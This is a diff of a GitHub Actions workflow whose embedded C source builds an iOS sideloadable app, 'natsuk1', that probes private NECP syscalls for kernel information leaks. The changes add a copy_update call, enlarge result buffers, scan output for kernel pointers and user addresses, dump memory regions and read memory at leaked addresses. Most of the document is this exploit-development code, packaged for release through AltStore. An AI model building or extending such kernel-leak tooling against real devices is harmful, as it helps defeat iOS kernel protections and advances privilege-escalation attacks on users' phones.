@@ -135,11 +135,10 @@ jobs:
           #define NECP_ADD_FLOW 0x11
           #define NECP_REMOVE_FLOW 0x12
           #define NECP_SYSCTL_ARENA 0x0D
-          #define NECP_ROUTE_STATS 0x0B
-          #define NECP_FLOW_STATS 0x1B
+          #define NECP_COPY_UPDATE 0x0F
           #define GATE_BYTE 9
 
-          #define RESBUF 8192
+          #define RESBUF 65536
 
           static volatile int g_busy = 0;
           static volatile int g_cancel = 0;
@@ -161,6 +160,7 @@ jobs:
           #define LR(t, ...) lg(t, "> ", __VA_ARGS__)
 
           static int is_kptr(uint64_t v) { return v >= KPTR_MIN && v <= KPTR_MAX; }
+          static int is_user_va(uint64_t v) { return v >= 0x100000000ULL && v < 0x800000000000ULL; }
 
           static int nfd(void) { return (int)syscall(SYS_NECP_OPEN, 0); }
 
@@ -194,6 +194,11 @@ jobs:
                                   (void*)0, (size_t)0, (void*)out, (size_t)8);
           }
 
+          static int ncpy_update(int fd, const uint8_t cu[16], uint8_t *b, size_t bl) {
+              return (int)syscall(SYS_NECP_ACTION, fd, NECP_COPY_UPDATE,
+                                  (void*)cu, (size_t)16, b, (size_t)bl);
+          }
+
           static void hexdump(const char *tag, const uint8_t *buf, int len, int max) {
               if (len > max) len = max;
               for (int i = 0; i < len; i += 16) {
@@ -218,77 +223,85 @@ jobs:
                   if (is_kptr(v)) {
                       LO(tag, "[%04x] = 0x%llx", i, (unsigned long long)v);
                       found++;
-                      if (found >= 16) break;
+                      if (found >= 24) break;
                   }
               }
               return found;
           }
 
-          static void tlv_walk(const char *tag, const uint8_t *buf, int len) {
-              int off = 0;
-              while (off + 5 <= len) {
-                  uint8_t type = buf[off];
-                  uint32_t l = 0;
-                  memcpy(&l, buf + off + 1, 4);
-                  if (l > (uint32_t)(len - off - 5)) {
-                      LI(tag, "off=%d type=0x%02x len=%u (truncated)", off, type, l);
-                      break;
+          static int scan_user_va(const char *tag, const uint8_t *buf, int len) {
+              int found = 0;
+              for (int i = 0; i + 8 <= len; i += 8) {
+                  uint64_t v;
+                  memcpy(&v, buf + i, 8);
+                  if (is_user_va(v)) {
+                      LI(tag, "[%04x] = 0x%llx", i, (unsigned long long)v);
+                      found++;
+                      if (found >= 24) break;
                   }
-                  LI(tag, "off=%d type=0x%02x len=%u", off, type, l);
-                  off += 5 + l;
-                  if (l == 0) break;
               }
+              return found;
           }
 
-          static int step_copy_result(void) {
+          static int step_copy_result_big(void) {
               nk_log("");
-              LI("S1", "copy_result");
+              LI("S1", "copy_result with 64K buffer");
               int fd = nfd();
               if (fd < 0) { LE("S1", "open errno=%d", errno); return -1; }
               uint8_t cu[16]; memset(cu, 0, sizeof(cu));
               if (nadd_client(fd, cu) != 0) { close(fd); return -1; }
               uint8_t fu[16];
               if (nadd_flow(fd, cu, fu) != 0) { close(fd); return -1; }
-              uint8_t buf[RESBUF]; memset(buf, 0, sizeof(buf));
-              int c = ncpy_result(fd, cu, buf, sizeof(buf));
-              LI("S1", "copy_result=%d bytes", c);
+
+              static uint8_t big[RESBUF];
+              memset(big, 0, sizeof(big));
+              int c = ncpy_result(fd, cu, big, sizeof(big));
+              LI("S1", "returned=%d bytes", c);
               close(fd);
+
               if (c > 0) {
-                  hexdump("S1H", buf, c, 512);
-                  int nk = scan_kptr("S1K", buf, c);
+                  LI("S1", "first 512:");
+                  hexdump("S1H", big, c, 512);
+                  int nk = scan_kptr("S1K", big, c);
                   LI("S1", "kptr count = %d", nk);
-                  tlv_walk("S1T", buf, c);
+                  int nu = scan_user_va("S1U", big, c);
+                  LI("S1", "user-va-like count = %d", nu);
               }
               return c;
           }
 
-          static int step_arena_twice(void) {
+          static int step_copy_update(void) {
               nk_log("");
-              LI("S2", "arena leak from two clients");
+              LI("S2", "copy_update op=0x0F");
+              int fd = nfd();
+              if (fd < 0) { LE("S2", "open errno=%d", errno); return -1; }
+              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
+              if (nadd_client(fd, cu) != 0) { close(fd); return -1; }
 
-              for (int i = 0; i < 2; i++) {
-                  int fd = nfd();
-                  if (fd < 0) { LE("S2", "open errno=%d", errno); return -1; }
-                  uint8_t cu[16]; memset(cu, 0, sizeof(cu));
-                  if (nadd_client(fd, cu) != 0) { close(fd); return -1; }
-                  uint64_t val = 0;
-                  int rc = nleak_kva(fd, &val);
-                  LI("S2", "client#%d rc=%d value=0x%llx", i, rc, (unsigned long long)val);
-                  close(fd);
+              static uint8_t big[RESBUF];
+              memset(big, 0, sizeof(big));
+              int c = ncpy_update(fd, cu, big, sizeof(big));
+              LI("S2", "returned=%d", c);
+              close(fd);
+              if (c > 0) {
+                  hexdump("S2H", big, c, 512);
+                  int nk = scan_kptr("S2K", big, c);
+                  LI("S2", "kptr count = %d", nk);
               }
-              return 0;
+              return c;
           }
 
-          static int step_region_dump(void) {
+          static int step_region_full(void) {
               nk_log("");
-              LI("S3", "region dump 0x100000000 - 0x120000000");
+              LI("S3", "full region dump 0x100000000 - 0x300000000");
 
               mach_port_t task = mach_task_self();
               vm_address_t addr = 0x100000000ULL;
-              vm_address_t limit = 0x120000000ULL;
+              vm_address_t limit = 0x300000000ULL;
               int count = 0;
+              int shown = 0;
 
-              while (addr < limit && count < 60) {
+              while (addr < limit && count < 500) {
                   vm_size_t size = 0;
                   vm_region_basic_info_data_64_t info;
                   mach_msg_type_number_t cnt = VM_REGION_BASIC_INFO_COUNT_64;
@@ -298,70 +311,125 @@ jobs:
                                                   VM_REGION_BASIC_INFO_64,
                                                   (vm_region_info_t)&info, &cnt, &obj);
                   if (kr != KERN_SUCCESS) {
-                      LI("S3", "vm_region kr=%d at 0x%llx", kr, (unsigned long long)addr);
+                      LI("S3", "stop at 0x%llx kr=%d",
+                         (unsigned long long)addr, kr);
                       break;
                   }
-                  LI("S3", "0x%llx - 0x%llx  size=0x%llx prot=%d",
-                     (unsigned long long)addr,
-                     (unsigned long long)(addr + size),
-                     (unsigned long long)size,
-                     info.protection);
+                  if (shown < 80) {
+                      LI("S3", "0x%llx - 0x%llx size=0x%llx prot=%d",
+                         (unsigned long long)addr,
+                         (unsigned long long)(addr + size),
+                         (unsigned long long)size,
+                         info.protection);
+                      shown++;
+                  }
                   addr += size;
                   count++;
                   if (size == 0) break;
               }
+              LI("S3", "total regions: %d, last addr=0x%llx",
+                 count, (unsigned long long)addr);
               return 0;
           }
 
-          static int step_route_stats(void) {
+          static int step_probe_leak_va(uint64_t uva) {
               nk_log("");
-              LI("S4", "op=0x0B route stats");
-              int fd = nfd();
-              if (fd < 0) { LE("S4", "open errno=%d", errno); return -1; }
-              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
-              if (nadd_client(fd, cu) != 0) { close(fd); return -1; }
+              LI("S4", "probe leak VA 0x%llx", (unsigned long long)uva);
 
-              uint8_t buf[256]; memset(buf, 0, sizeof(buf));
-              int c = (int)syscall(SYS_NECP_ACTION, fd, NECP_ROUTE_STATS,
-                                   (void*)cu, (size_t)16, buf, (size_t)0x48);
-              LI("S4", "op=0x0B returned %d", c);
-              close(fd);
-              if (c > 0) {
-                  hexdump("S4H", buf, c, 0x48);
-                  int nk = scan_kptr("S4K", buf, c);
+              mach_port_t task = mach_task_self();
+
+              vm_address_t a = (vm_address_t)uva;
+              vm_size_t size = 0;
+              vm_region_basic_info_data_64_t info;
+              mach_msg_type_number_t cnt = VM_REGION_BASIC_INFO_COUNT_64;
+              mach_port_t obj = MACH_PORT_NULL;
+
+              kern_return_t kr = vm_region_64(task, &a, &size,
+                                              VM_REGION_BASIC_INFO_64,
+                                              (vm_region_info_t)&info, &cnt, &obj);
+              LI("S4", "vm_region at 0x%llx kr=%d", (unsigned long long)uva, kr);
+              if (kr == KERN_SUCCESS) {
+                  LI("S4", "  region start=0x%llx size=0x%llx prot=%d",
+                     (unsigned long long)a, (unsigned long long)size,
+                     info.protection);
+              }
+
+              uint8_t buf[256];
+              memset(buf, 0, sizeof(buf));
+              mach_vm_size_t outsz = 0;
+              kr = mach_vm_read_overwrite(task,
+                                          (mach_vm_address_t)uva,
+                                          sizeof(buf),
+                                          (mach_vm_address_t)(uintptr_t)buf,
+                                          &outsz);
+              LI("S4", "vm_read kr=%d outsz=%llu",
+                 kr, (unsigned long long)outsz);
+              if (kr == KERN_SUCCESS && outsz > 0) {
+                  hexdump("S4H", buf, (int)outsz, 256);
+                  int nk = scan_kptr("S4K", buf, (int)outsz);
                   LI("S4", "kptr count = %d", nk);
               }
-              return c;
+
+              uint64_t up = uva | 0xFFFFFFF000000000ULL;
+              LI("S4", "try kernel-form 0x%llx", (unsigned long long)up);
+              a = (vm_address_t)up;
+              size = 0;
+              kr = vm_region_64(task, &a, &size,
+                                VM_REGION_BASIC_INFO_64,
+                                (vm_region_info_t)&info, &cnt, &obj);
+              LI("S4", "vm_region at 0x%llx kr=%d", (unsigned long long)up, kr);
+
+              return 0;
           }
 
-          static int step_flow_stats(void) {
+          static int step_arena_multi(void) {
               nk_log("");
-              LI("S5", "op=0x1B flow stats");
-              int fd = nfd();
-              if (fd < 0) { LE("S5", "open errno=%d", errno); return -1; }
-              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
-              if (nadd_client(fd, cu) != 0) { close(fd); return -1; }
+              LI("S5", "arena leak across 3 clients");
 
-              uint8_t fu[16]; memset(fu, 0, sizeof(fu));
-              if (nadd_flow(fd, cu, fu) != 0) { close(fd); return -1; }
-
-              uint8_t buf[0x200]; memset(buf, 0, sizeof(buf));
-              int c = (int)syscall(SYS_NECP_ACTION, fd, NECP_FLOW_STATS,
-                                   (void*)fu, (size_t)16, buf, (size_t)0x1ac);
-              LI("S5", "op=0x1B returned %d", c);
-              close(fd);
-              if (c > 0) {
-                  hexdump("S5H", buf, c, 0x1ac);
-                  int nk = scan_kptr("S5K", buf, c);
-                  LI("S5", "kptr count = %d", nk);
+              int fds[3];
+              uint8_t cu[3][16];
+              for (int i = 0; i < 3; i++) {
+                  fds[i] = nfd();
+                  if (fds[i] < 0) { LE("S5", "open errno=%d", errno); return -1; }
+                  memset(cu[i], 0, 16);
+                  if (nadd_client(fds[i], cu[i]) != 0) { close(fds[i]); return -1; }
               }
-              return c;
+              uint64_t last = 0;
+              for (int i = 0; i < 3; i++) {
+                  uint64_t v = 0;
+                  int rc = nleak_kva(fds[i], &v);
+                  LI("S5", "client#%d rc=%d value=0x%llx (delta=0x%llx)",
+                     i, rc, (unsigned long long)v,
+                     (unsigned long long)(v - last));
+                  last = v;
+              }
+              for (int i = 0; i < 3; i++) {
+                  uint8_t buf[64];
+                  memset(buf, 0, sizeof(buf));
+                  mach_vm_size_t outsz = 0;
+                  kern_return_t kr = mach_vm_read_overwrite(mach_task_self(),
+                                                            last,
+                                                            sizeof(buf),
+                                                            (mach_vm_address_t)(uintptr_t)buf,
+                                                            &outsz);
+                  if (i == 0) {
+                      LI("S5", "vm_read on leak addr kr=%d outsz=%llu",
+                         kr, (unsigned long long)outsz);
+                      if (kr == KERN_SUCCESS && outsz > 0) {
+                          hexdump("S5H", buf, (int)outsz, 64);
+                          int nk = scan_kptr("S5K", buf, (int)outsz);
+                          LI("S5", "kptr count = %d", nk);
+                      }
+                  }
+                  close(fds[i]);
+              }
+              return 0;
           }
 
           static int impl(void) {
               nk_log("");
               nk_log("================================================================");
-              nk_log("natsuk1 v4.7 - NECP recon");
+              nk_log("natsuk1 v4.8 - NECP recon");
               nk_log("iOS 27.0 / iPhone14,5 / 24A437");
               nk_log("================================================================");
               nk_log("");
@@ -370,11 +438,12 @@ jobs:
               close(fd);
               LO("PRE", "necp_open OK");
 
-              step_copy_result();
-              step_arena_twice();
-              step_region_dump();
-              step_route_stats();
-              step_flow_stats();
+              step_copy_result_big();
+              step_copy_update();
+              step_arena_multi();
+              step_region_full();
+              step_probe_leak_va(0x100f58000ULL);
+              step_probe_leak_va(0x100f58000ULL);
 
               nk_log("");
               nk_log("======== done ========");
@@ -448,7 +517,7 @@ jobs:
           fi
           REPO="${{ github.repository }}"
           IPA_URL="https://github.com/${REPO}/releases/download/development/natsuk1.ipa"
-          NOTES="natsuk1 v4.7 dev
+          NOTES="natsuk1 v4.8 dev
 
           IPA: ${IPA_URL}
           AltStore: altstore://install?url=${IPA_URL}
